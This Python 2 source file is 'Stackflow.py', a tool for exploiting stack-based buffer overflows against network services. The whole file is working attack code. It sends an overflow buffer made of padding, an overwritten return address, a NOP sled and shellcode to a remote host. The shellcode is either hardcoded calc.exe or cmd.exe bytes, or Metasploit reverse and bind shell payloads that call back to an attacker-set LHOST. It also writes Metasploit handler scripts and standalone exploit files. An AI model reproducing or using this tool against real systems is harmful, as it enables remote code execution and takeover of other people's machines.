#!/usr/bin/python
#
# Stackflow.py - Universal stack-based buffer overflow exploitation tool
#  by @d4rkcat github.com/d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from socket import socket, SOCK_STREAM, AF_INET
from os import system, path as opath
from sys import argv, path
from argparse import ArgumentParser
from re import findall

parser = ArgumentParser(prog='stackflow', usage='./stackflow.py OPTIONS')
parser.add_argument('-r', "--rhost", type=str, help='rhost')
parser.add_argument('-p', "--rport", type=str, help='rport')
parser.add_argument('-c', "--cmds", type=str, help='commands to send to server before overflow')
parser.add_argument('-v', "--vulncmd", type=str, help='vulnerable command')
parser.add_argument('-o', "--offset", type=int, help='offset to EIP')
parser.add_argument('-ao', "--autooffset", type=str, help='calculate offset from cyclic pattern EIP string')
parser.add_argument('-a', "--returnadd", type=str, help='return address')
parser.add_argument('-n', "--nops", type=int, help='number of NOPS \\x90 x 4 to prepend')
parser.add_argument('-m', "--payload", type=str, help='MSF payload')
parser.add_argument('-i', "--lhost", type=str, help='lhost')
parser.add_argument('-l', "--lport", type=str, help='lport')
parser.add_argument('-f', "--fuzz", type=str, help='Fuzz with cyclic pattern of size')
parser.add_argument('-t', "--calc", action="store_true", help='Send calc.exe shellcode')
parser.add_argument('-t1', "--cmdprompt", action="store_true", help='Send cmd.exe shellcode')
parser.add_argument('-d', "--display", action="store_true", help='Display the exploit buffer')
parser.add_argument('-q', "--quiet", action="store_true", help='Display less cruft')
parser.add_argument('-w', "--timeout", type=int, help='Timeout for socket (Default: 5)')
parser.add_argument('-e', "--cfexport", type=str, help='Export exploit config and metasploit rc file')
parser.add_argument('-g', "--cfimport", type=str, help='Import and run exploit from config file')
parser.add_argument('-s', "--standalone", type=str, help='Export exploit to a standalone python script')
args = parser.parse_args()

def generate(payload):		#Generate shellcode
	if payload == 'calc':
		if not quiet:
			print yellowtext + "[>]" + resettext + " Shellcode: \t\t" + greentext + "calc.exe"
		return ("\xbf\xc2\x51\xc1\x05\xda\xd4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x33\x83\xea\xfc\x31\x7a\x0e\x03\xb8\x5f\x23\xf0\xc0\x88\x2a\xfb"
		"\x38\x49\x4d\x75\xdd\x78\x5f\xe1\x96\x29\x6f\x61\xfa\xc1\x04\x27\xee\x52\x68\xe0\x01\xd2\xc7\xd6\x2c\xe3\xe9\xd6\xe2\x27\x6b"
		"\xab\xf8\x7b\x4b\x92\x33\x8e\x8a\xd3\x29\x61\xde\x8c\x26\xd0\xcf\xb9\x7a\xe9\xee\x6d\xf1\x51\x89\x08\xc5\x26\x23\x12\x15\x96"
		"\x38\x5c\x8d\x9c\x67\x7d\xac\x71\x74\x41\xe7\xfe\x4f\x31\xf6\xd6\x81\xba\xc9\x16\x4d\x85\xe6\x9a\x8f\xc1\xc0\x44\xfa\x39\x33"
		"\xf8\xfd\xf9\x4e\x26\x8b\x1f\xe8\xad\x2b\xc4\x09\x61\xad\x8f\x05\xce\xb9\xc8\x09\xd1\x6e\x63\x35\x5a\x91\xa4\xbc\x18\xb6\x60"
		"\xe5\xfb\xd7\x31\x43\xad\xe8\x22\x2b\x12\x4d\x28\xd9\x47\xf7\x73\xb7\x96\x75\x0e\xfe\x99\x85\x11\x50\xf2\xb4\x9a\x3f\x85\x48"
		"\x49\x04\x79\x03\xd0\x2c\x12\xca\x80\x6d\x7f\xed\x7e\xb1\x86\x6e\x8b\x49\x7d\x6e\xfe\x4c\x39\x28\x12\x3c\x52\xdd\x14\x93\x53"
		"\xf4\x76\x72\xc0\x94\x56\x11\x60\x3e\xa7")
	elif payload == 'cmd':
		if not quiet:
			print yellowtext + "[>]" + resettext + " Shellcode: \t\t" + greentext + "cmd.exe"
		return ("\x6a\x3f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x54\x8b\x21\xdd\x83\xeb\xfc\xe2\xf4\x3e\xb2\x78\x04\xba\x52\x55\xf9\xa0"
		"\xd0\xa0\xae\x47\x35\xb9\x38\x27\x08\xca\x21\xb6\x7f\x63\xad\x38\xf8\x9f\x45\xd1\x71\x7a\x74\x63\x9c\x14\x17\x81\x73\xcd\x49"
		"\x3a\xaa\x8b\xce\xc3\xd0\x90\xf2\xfb\xde\xae\xba\x80\x38\x33\x79\xd0\x84\x9d\x69\x91\x39\x50\x48\xb0\x3f\x7d\xb5\xe3\xaf\x14"
		"\x17\xa1\x73\xdd\x79\xb0\x28\x14\x05\xc9\x7d\x5f\x31\xfb\xf9\x4f\x15\x3a\xb0\x87\xce\xe9\xd8\x9e\x96\x52\xc4\xd6\xce\x85\x73"
		"\x9e\x93\x80\x07\xae\x85\x1d\x39\x50\x48\xb0\x3f\xa7\xa5\xc4\x0c\x9c\x38\x49\xc3\xe2\x61\xc4\x1a\xc7\xce\xe9\xdc\x9e\x96\xd7"
		"\x73\x93\x0e\x3a\xa0\x83\x44\x62\x73\x9b\xce\xb0\x28\x16\x01\x95\xdc\xc4\x1e\xd0\xa1\xc5\x14\x4e\x18\xc7\x1a\xeb\x73\x8d\xae"
		"\x37\xa5\xf5\x44\x3c\x7d\x26\x45\xb1\xf8\xcf\x2d\x80\x73\xf0\xc2\x4e\x2d\x24\xb5\x04\x5a\xc9\x2d\x17\x6d\x22\xd8\x4e\x2d\xa3"
		"\x43\xcd\xf2\x1f\xbe\x51\x8d\x9a\xfe\xf6\xeb\xed\x2a\xdb\xf8\xcc\xba\x64\x9b\xf2\x21\x91\xd7\xd4\x65\xc5\x91\xeb\x29\xd4\xd8"
		"\xcc\x31\xd0\x9b\xf4\x23\xdd\x97\xe8\x65\xd2\x95\xfb\x65\xe2\x90\xfa\x29\xdd\xd8\xcb\x08\xb1\xf8\x21\xdd")
	elif fuzz:
		if not quiet:
			print yellowtext + "[>]" + resettext + " Shellcode: \t\tCyclic pattern of size " + greentext + fuzz
		print greentext + "\n[+]" + resettext + " Generating cyclic pattern..\n"
		system('$(locate pattern_create.rb | grep work/tools | head -n 1) ' + fuzz + ' > /tmp/fuzz')
		f = open('/tmp/fuzz', 'r')
		return f.read()
		f.close()
	else:
		if not quiet:
			print yellowtext + "[>]" + resettext + " Shellcode: \t\t" + greentext + payload
		print greentext + "\n[+]" + resettext + " Generating " + payload + " shellcode.\n"
		if findall('bind', payload):  # msfvenom is broken!?, use msfpayload until it gets fixed.
			#cmd = str('$(which msfvenom) -p ' + payload + ''' -e x86/shikata_ga_nai -i 2 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -f py LPORT=''' + lport + ''' | tail -n +2 | cut -c 8- | tr -d '\n' | tr -d '"' > /tmp/shlcde''')
			cmd = str('$(which msfpayload) ' + payload + " LPORT='" + lport + "' R | $(which msfencode) -e x86/shikata_ga_nai -b \\x00\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x20\\x40\\xfe\\xff -c 2 -t py | tail -n +2 | cut -c 8- | tr -d '\n' |" + ''' tr -d '"' > /tmp/shlcde''')
		else:
			#cmd = str('$(which msfvenom) -p ' + payload + ''' -e x86/shikata_ga_nai -i 2 -b \\x00\\xff\\x0a\\x0d\\xf1\\x20\\x40 -f py LHOST=''' + lhost + ' LPORT=' + lport + ''' | tail -n +2 | cut -c 8- | tr -d '\n' | tr -d '"' > /tmp/shlcde''')
			cmd = str('$(which msfpayload) ' + payload + " LHOST='" + lhost + "' LPORT='" + lport + "' R | $(which msfencode) -e x86/shikata_ga_nai -b \\x00\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x20\\x40\\xfe\\xff -c 2 -t py | tail -n +2 | cut -c 8- | tr -d '\n' |" + ''' tr -d '"' > /tmp/shlcde''')
		system(cmd)
		f = open('/tmp/shlcde', 'r')
		return f.read()
		f.close()

def flipbytes(returnadd):		#Flip return address
	if len(returnadd) == 8:
		returnadd = '\\x' + returnadd[6:8] + '\\x' + returnadd[4:6] + '\\x' + returnadd[2:4] + '\\x' + returnadd[0:2]
		return returnadd.decode('string_escape')
	else:
		print redtext + '[X]' + resettext + ' Return address must be 8 characters!\n'
		exit()

def hexstr(rawbytes):		#Make raw bytes into readable string
		s, l = rawbytes.encode('hex'), []
		for i in xrange(0, len(s), 2):
			l.append(s[i:i+2])
		return '\\x' + '\\x'.join(l)

def aoffset(autooffset):		#Calculate offset from EIP string
	if len(autooffset) == 4 or len(autooffset) == 8:
		print  bluetext + "\n[*]" + resettext + ' Calculating offset from string "' + autooffset + '"'
		cmd = '$(locate -r pattern_offset.rb | head -n 1) ' + autooffset + " | cut -d ' ' -f 6 > /tmp/offset"
		system(cmd)
		p = open('/tmp/offset', 'r')
		try:
			ofs = int(p.read().strip('\n'))
			print  greentext + "[+]" + resettext + " Offset found: " + str(ofs)
			return ofs
		except:
			print redtext + '[X]' + resettext + ' No offset found for ' + autooffset + '!\n'
			exit()
		p.close()
	else:
		print redtext + '[X]' + resettext + ' Auto-Offset string must be 4 or 8 characters!\n'
		exit()

def configimport(configfile):		#Import exploit config
	path.append(datadir + '/exploits')
	global args
	if configfile.endswith('.py'):
		configfile = configfile[:-3]
	try:
		print greentext + '[+]' + resettext + ' Loading ' + configfile + '.py config file\n'
		args = __import__(configfile)
	except:
		print redtext + '[X]' + resettext + ' Config file ' + datadir + '/exploits/' + configfile + '.py not found!\n'
		exit()

def configexport(configfile):		#Export exploit config and rc file
	system('mkdir -p ' + datadir + '/exploits')
	print bluetext + '\n[*]' + resettext + ' Preparing exploit for export.'
	cf, rc = open(datadir + '/exploits/' + configfile + '.py', 'w'), False
	if not fuzz and not calc and not cmdprompt:
		if not quiet:
			if vulncmd:
				print  yellowtext + "[>]" + resettext + " Vulnerable command:\t" + greentext + vulncmd
			print  yellowtext + "[>]" + resettext + " Offset:\t\t" + greentext + str(args.offset)
			print  yellowtext + "[>]" + resettext + " Return address: \t" + greentext + args.returnadd
			print  yellowtext + "[>]" + resettext + " Nops:\t\t" + greentext + str(nops * 4)
		
		rc, sc, pb = open(datadir + '/exploits/' + configfile + '.rc', 'w'), generate(payload), False
		cf.write("shellcode='" + sc + "'\n")
		if findall('bind', payload):
			rc.write('python ' + datadir + '/' + scriptname + ' -g ' + configfile + '\n')
			pb = True
		rc.write('use exploit/multi/handler\nset PAYLOAD ' + payload + '\n')
		if pb:
			rc.write('set RHOST ' + rhost + '\n')
		else:
			rc.write('set LHOST ' + lhost + '\n')
		rc.write('set LPORT ' + lport + '\n')
		if findall('meterpreter', payload) and findall('windows', payload):
			rc.write('set AutoRunScript post/windows/manage/migrate\n')
		if pb:
			rc.write('sleep 2\n')
		rc.write('exploit -j\n')
		if not pb:
			rc.write('python ' + datadir + '/' + scriptname + ' -g ' + configfile + '\n')	
		rc.close()
		print greentext + '[+]' + resettext + ' Metasploit rc file written to ' + datadir + '/exploits/' + configfile + '.rc\n' + greentext + '[+]' + resettext + ' Run the exploit and handler: msfconsole -r ' + configfile + '.rc\n'

	if fuzz:
		pat = generate('fuzz')
		cf.write("pattern='" + pat.strip('\n') + "'\n")

	conf = str(args).replace('Namespace', '').strip('(').strip(')').split(',')
	for var in conf:
		cf.write(var.strip() + '\n')
	cf.close()
	if not rc:
		print greentext + '\n[+]' + resettext + ' Exploit config file written to ' + datadir + '/exploits/' + configfile + '.py\n' 

def selfexport(exploitfile):		#Export exploit as a standalone python script
	system('mkdir -p ' + datadir + '/standalone')
	print bluetext + '\n[*]' + resettext + ' Preparing exploit for standalone export.'
	se = open(datadir + '/standalone/' + exploitfile + '.py', 'w')
	se.write('#!/usr/bin/python\nfrom socket import socket, SOCK_STREAM, AF_INET\nes = socket(AF_INET, SOCK_STREAM)\nes.settimeout(5)\n')
	se.write('es.connect(("' + rhost + '", ' + rport + '))\nprint es.recv(2048)\n')
	if args.cmds:
		cmds = args.cmds.strip('\n').split('&')
		for cmd in cmds:
			se.write("es.send('" + cmd + "\\r\\n')\nprint es.recv(2048)\n")
	if not fuzz:
		if calc:
			sc = generate('calc')
		elif cmdprompt:
			sc = generate('cmd')
		else:
			sc = generate(payload)
		
		if vulncmd:
			cmd = "ebuf = '" + vulncmd + " ' + 'A' * " + str(buflen) + " + '" + hexstr(returnadd) + '\\x90' * nops * 4 + sc.strip('\n') + "'\n"
		else:
			cmd = "ebuf = 'A' * " + str(buflen) + " + '" + hexstr(returnadd) + '\\x90' * nops * 4 + sc.strip('\n') + "'\n"
	else:
		sc = generate('fuzz')
		if vulncmd:
			cmd = "ebuf = '" + vulncmd + " " + sc.strip('\n') + "'\n"
		else:
			cmd = "ebuf = '" + sc.strip('\n') + "'\n"
	se.write(cmd)
	se.write('es.send(ebuf)\nes.settimeout(0.5)\n''try:\n\tprint es.recv(2048)\nexcept:\n\tpass\nes.close()\n')
	if fuzz:
		se.write('print "[*] Fuzzing buffer of size ' + fuzz + ' sent."\n')
	elif calc:
		se.write('print "[*] calc.exe shellcode sent."\n')
	elif cmdprompt:
		se.write('print "[*] cmd.exe shellcode sent."\n')
	else:
		if findall('bind', payload):
			se.write('print """[*] ' + payload + ' sent.\n[*] RHOST: ' + rhost + '\n[*] LPORT: ' + lport + '"""\n')
		else:
			se.write('print """[*] ' + payload + ' sent.\n[*] LHOST: ' + lhost + '\n[*] LPORT: ' + lport + '"""\n')
	se.close()
	print greentext + '[+]' + resettext + ' Exploit saved to ' + datadir + '/standalone/' + exploitfile + '.py'


def communicate(rhost,rport,payload,buflen,lhost,lport):		#Communicate with the server
	es = socket(AF_INET, SOCK_STREAM)
	es.settimeout(timeout)
	if not quiet:
		print bluetext + '[>]' + resettext + ' Attempting to connect to ' + rhost + ':' + rport
	try:
		es.connect((rhost, int(rport)))
		if not quiet:
			print greentext + '[<] ' + resettext + es.recv(2048)
		else:
			es.recv(2048)
		print  greentext + "[+]" + resettext + " Connection established."
	except Exception, e:
		print redtext + "\n[X]" + resettext + " Could not connect to " + rhost + ":" + rport + '\n'
		print e
		exit()

	if args.cmds:
		cmds = args.cmds.strip('\n').split('&')
		for cmd in cmds:
			es.send(cmd + '\r\n')
			try:
				if not quiet:
					print bluetext + '[>] ' + resettext + cmd
					print greentext + '[<] ' + resettext + es.recv(2048)
				else:
					es.recv(2048)
			except:
				pass

	if vulncmd:
		buf = vulncmd + ' '
	else:
		buf = ''

	if fuzz:
		try:
			if args.pattern:
				sc = args.pattern
				buf += sc
		except:
			sc = generate('fuzz')
			buf += sc
	else:
		a, b = divmod(buflen, len('Pwn3D!'))
		buf += 'Pwn3D!' * a + 'Pwn3D!'[:b]
		buf += returnadd
		buf += "\x90" * 4 * nops
		ch = True

		if not quiet:
			if vulncmd:
				print  yellowtext + "[>]" + resettext + " Vulnerable command:\t" + greentext + vulncmd
			print  yellowtext + "[>]" + resettext + " Offset:\t\t" + greentext + str(buflen)
			print  yellowtext + "[>]" + resettext + " Return address: \t" + greentext + args.returnadd
			print  yellowtext + "[>]" + resettext + " Nops:\t\t" + greentext + str(nops * 4) + resettext

		if calc:
			sc = generate('calc')

		elif cmdprompt:
			sc = generate('cmd')

		else:
			try:
				sc = args.shellcode
			except:
				sc, ch = generate(payload), False
		buf += sc.decode('string_escape')
		if ch:
			sc = hexstr(sc)

	if display:
		print bluetext + '\n[*]' + resettext + ' Exploit Buffer:'
		if not fuzz:
			if vulncmd:
				print "ebuf = '" + vulncmd + " ' + 'A' * " + str(buflen) + " + '" + hexstr(returnadd) + '\\x90' * nops * 4 +  sc.strip('\n') + "'"
			else:
				print "ebuf = 'A' * " + str(buflen) + " + '" + hexstr(returnadd) + '\\x90' * nops * 4 + sc.strip('\n') + "'"
		else:
			if vulncmd:
				print "ebuf = '" + vulncmd + " " + sc.strip('\n') + "'"
			else:
				print "ebuf = '" + sc.strip('\n') + "'"
	try:
		es.send(buf)
		if not fuzz and not calc and not cmdprompt:
			if findall('bind', payload):
				print greentext + '\n[+]' + resettext + ' Payload ' + greentext + payload + resettext + ' should be listening on ' + greentext + rhost + ':' + lport + '\n' + resettext
			else:
				print greentext + '\n[+]' + resettext + ' Payload ' + greentext + payload + resettext + ' should be connecting back to ' + greentext + lhost + ':' + lport + '\n' + resettext
		elif calc:
			print greentext + '\n[+]' + resettext + ' calc.exe should be running, enjoy your calculations..\n'
		elif cmdprompt:
			print greentext + '\n[+]' + resettext + ' cmd.exe should be running, enjoy your session..\n'
		else:
			print greentext + '\n[Z]' + resettext + ' Cyclic pattern fuzzing buffer of size ' + fuzz + ' sent..\n'
	except Exception, e:
		print redtext + '[X]' + resettext + ' Possible error sending exploit!\n'
		print e

	es.settimeout(0.5)
	try:
		es.recv(2048)
	except:
		pass
	es.close()


datadir = opath.dirname(opath.realpath(__file__))
scriptname = argv[0].split('/')[1]
bluetext = '\033[01;34m'
greentext = '\033[01;32m'
redtext = '\033[01;31m'
yellowtext = '\033[01;33m'	
resettext = '\033[0m'

if args.cfimport:
	configimport(args.cfimport)

lhost = args.lhost
lport = args.lport
rhost = args.rhost
rport = args.rport
payload = args.payload
buflen = args.offset
fuzz = args.fuzz
calc = args.calc
cmdprompt = args.cmdprompt
display = args.display
vulncmd = args.vulncmd
returnadd = args.returnadd
autooffset = args.autooffset
quiet = args.quiet
timeout = 5
nops = 3

if args.timeout:
	timeout = args.timeout

if args.nops:
	nops = args.nops

if not fuzz:
	if not returnadd:
		print redtext + '[X]' + resettext + ' You must specify the return address!\n'
		exit()
	if not buflen and not autooffset:
		print redtext + '[X]' + resettext + ' You must specify the offset or offset string!\n'
		exit()
	if not calc and not cmdprompt:
		if not lport or not payload:
			print redtext + '[X]' + resettext + ' You must specify the lport and payload!\n'
			exit()

if not rhost or not rport:
	print redtext + '[X]' + resettext + ' You must specify the remote host and remote port!\n'
	exit()

if returnadd:
	returnadd = flipbytes(returnadd)

if autooffset:
	args.offset, args.autooffset = aoffset(autooffset), None
	buflen = args.offset

if args.cfexport:
	cf = args.cfexport
	args.cfexport = None
	configexport(cf)

elif args.standalone:
	selfexport(args.standalone)

else:
	communicate(rhost,rport,payload,buflen,lhost,lport)